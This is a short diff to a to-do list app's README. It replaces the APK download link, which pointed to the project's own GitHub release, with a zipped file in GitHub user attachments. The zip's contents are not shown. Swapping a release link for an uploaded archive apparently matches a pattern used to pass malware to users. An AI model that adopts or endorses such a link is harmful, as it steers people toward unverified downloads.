@@ -55,7 +55,7 @@ For quick testing without signing:
 
 ## 📥 Download APK
 
-🔗 **[Download To-Do List App APK](https://github.com/Chaithanya8861/todo-list-app/releases/download/v1.0/app-debug.apk)**
+🔗 **[Download To-Do List App APK](https://github.com/user-attachments/files/28399171/app-debug.apk.zip)**
 
 ## 🤝 Contributing
 
